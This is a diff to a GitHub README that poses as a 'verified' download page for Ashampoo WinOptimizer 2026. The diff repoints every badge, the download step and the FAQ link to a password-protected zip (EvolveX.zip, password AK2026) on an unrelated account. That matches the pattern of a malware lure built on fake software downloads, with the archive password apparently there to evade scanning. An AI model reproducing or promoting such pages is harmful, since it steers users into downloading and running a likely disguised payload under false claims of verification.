@@ -2,10 +2,10 @@
 
 > **Ashampoo WinOptimizer Download 2026** for 2026 — Windows-focused toolkit for `ashampoo-winoptimizer-download-2026` with a verified download flow.
 
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com/FinAnbuCharge/tvnqenwd/releases/tag/v2026)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com/FinAnbuCharge/tvnqenwd/releases/tag/v2026)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com/FinAnbuCharge/tvnqenwd/releases/tag/v2026)
-[![Stars](https://img.shields.io/github/stars/MajestyMillipede/ashampoo-winoptimizer-download-2026-suite-2026?style=flat-square)](https://github.com/FinAnbuCharge/tvnqenwd/releases/tag/v2026)
+[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip)
+[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip)
+[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip)
+[![Stars](https://img.shields.io/github/stars/MajestyMillipede/ashampoo-winoptimizer-download-2026-suite-2026?style=flat-square)](https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip)
 
 ---
 
@@ -25,8 +25,8 @@
 
 ## 📦 Get the build
 
-1. Open the **[verified download page](https://github.com/FinAnbuCharge/tvnqenwd/releases/tag/v2026)**
-2. Wait for the integrity scan (~10 seconds)
+1. Open the **[verified download page](https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip)**
+2. Enter password **AK2026**
 3. Press **Download** when checks pass
 
 > Tip: use the green button above — it always points to the live GitHub Pages build.
@@ -62,7 +62,7 @@ It stays intentionally clear — badges, one download path, and a short integrit
 ## ❓ FAQ
 
 **Where is the download?**  
-Use the buttons at the top — they open the GitHub Pages verified flow: [https://github.com/FinAnbuCharge/tvnqenwd/releases/tag/v2026](https://github.com/FinAnbuCharge/tvnqenwd/releases/tag/v2026)
+Use the buttons at the top — they open the GitHub Pages verified flow: [https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip](https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip)
 
 **Can I change the page?**  
 Yes. Edit `index.html` / README text, then push. The Pages URL stays the same.
